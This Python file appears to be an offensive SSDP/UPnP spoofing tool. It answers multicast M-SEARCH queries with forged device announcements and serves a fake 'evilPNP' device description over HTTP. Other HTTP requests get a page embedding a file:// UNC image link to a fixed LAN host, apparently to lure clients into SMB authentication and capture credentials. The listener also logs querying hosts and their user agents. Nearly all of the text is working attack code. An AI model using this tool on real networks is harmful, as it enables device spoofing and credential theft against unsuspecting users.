#!/usr/bin/env python3

import socket
import struct
import sys
import time
import re
from http.server import BaseHTTPRequestHandler
from email.utils import formatdate

# Set up some nice colors
class bcolors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    ORANGE = '\033[93m'
    ENDC = '\033[0m'
okBox = bcolors.BLUE + '[*] ' + bcolors.ENDC
noteBox = bcolors.GREEN + '[+] ' + bcolors.ENDC
warnBox = bcolors.ORANGE + '[!] ' + bcolors.ENDC
msearchBox = bcolors.BLUE + '[M-SEARCH] ' + bcolors.ENDC
httpBox = bcolors.GREEN + '[HTTP REQUEST] ' + bcolors.ENDC


class SSDPListener:
    def __init__(self, localIp, localPort, serverName):
        self.sock = None
        self.knownHosts = []
        self.localIp = localIp
        self.localPort = localPort
        self.serverName = serverName
    def run(self):
        ssdpPort = 1900			# This is defined by the SSDP spec, do not change
        mcastGroup='239.255.255.250'	# This is defined by the SSDP spec, do not change
        serverAddress = ('', ssdpPort)
        knownHosts = []
        
        # Create the socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        #self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Bind to the server address
        self.sock.bind(serverAddress)
        
        # Tell the operating system to add the socket to
        # the multicast group on for the interface on the specific IP.
        group = socket.inet_aton(mcastGroup)
        mreq = struct.pack('4s4s', group, socket.inet_aton(self.localIp))
        self.sock.setsockopt(
            socket.IPPROTO_IP,
            socket.IP_ADD_MEMBERSHIP,
            mreq)
        
        # Receive/respond loop
        while True:
            data, address = self.sock.recvfrom(1024)
            self.process_data(data,address)

    def process_data(self, data, address):
        (remoteIp,remotePort) = address
        if 'M-SEARCH' in str(data):
            try:
                requestedST = re.findall(r'\\r\\nST:(.*?)\\r\\n', str(data))[0].strip()
            except:
                requestedST = 'ssdp:all'
            if address[0] not in self.knownHosts:
                print(msearchBox + "New Host {}, Service Type: {}".format(remoteIp, requestedST))
                self.knownHosts.append(address[0])
            self.send_location(address, requestedST)

    def send_location(self, address, requestedST):
        URL = 'http://{}:{}/ssdp/device-desc.xml'.format(self.localIp, self.localPort)
        lastSeen = str(time.time())
        dateFormat = formatdate(timeval=None, localtime=False, usegmt=True)
        reply = 'HTTP/1.1 200 OK\r\n'
        reply += 'CACHE-CONTROL: max-age=1800\r\n'
        reply += 'DATE: ' + dateFormat + '\r\n'
        reply += 'EXT: \r\n'
        reply += 'LOCATION: ' + URL + '\r\n'
        reply += 'SERVER: Linux/3.10.96+, UPnP/1.0, eSSDP/0.1\r\n'
        reply += 'ST: {}\r\n'.format(requestedST)
        reply += 'USN: uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563:upnp-rootdevice\n'
        reply += 'BOOTID.UPNP.ORG: 0\r\n'
        reply += 'CONFIGID.UPNP.ORG: 1\r\n'
        reply += '\r\n\r\n'
        reply = bytes(reply, 'utf-8')
        self.sock.sendto(reply, address)

class DeviceDescriptor(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/ssdp/device-desc.xml':
            xmlFile = self.buildDeviceXml()
            self.send_response(200)
            self.send_header('Content-type', 'application/xml')
            self.end_headers()
            self.wfile.write(xmlFile.encode())
        elif self.path == '/ssdp/service-desc.xml':
            xmlFile = self.buildServiceXml()
            self.send_response(200)
            self.send_header('Content-type', 'application/xml')
            self.end_headers()
            self.wfile.write(xmlFile.encode())
        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write('<img src="file://///192.168.1.243/img.png">'.encode())

    def log_message(self, format, *args):
        address = self.address_string()
        headers = self.headers['user-agent']
        verb = self.command
        path = self.path
        print(httpBox + "Host: {}, User-Agent: {}".format(address, headers))
        print("               {} {}".format(verb, path))
    
    def buildDeviceXml(self):
        localIp,localPort = self.server.server_address
        xmlFile = '''<root>
    <specVersion>
        <major>1</major>
        <minor>0</minor>
    </specVersion>
    <device>
        <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
        <friendlyName>evilPNP</friendlyName>
        <manufacturer>eCorp</manufacturer>
        <manufacturerURL>http://ecorp.co</manufacturerURL>
        <modelDescription>eMedia Server</modelDescription>
        <modelName>Black Edition</modelName>
        <modelNumber>666</modelNumber>
        <modelURL>http://ecorp.co/model666</modelURL>
        <serialNumber>1337</serialNumber>
        <UDN>uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563</UDN>
        <serviceList>
            <service>
                <URLBase>http://{}:{}</URLBase>
                <serviceType>urn:ecorp.co:service:ePNP:1</serviceType>
                <serviceId>urn:epnp.ecorp.co:serviceId:ePNP</serviceId>
                <controlURL>/epnp</controlURL>
                <eventSubURL/>
                <SCPDURL>/service-desc.xml</SCPDURL>
            </service>
        </serviceList>
        <presentationURL>http://{}:{}/present.html</presentationURL>
        </device>
    </root>'''.format(localIp, localPort, localIp, localPort)
        return xmlFile

    def buildServiceXml(self):
        xmlFile = '<root></root>'
        return xmlFile
    
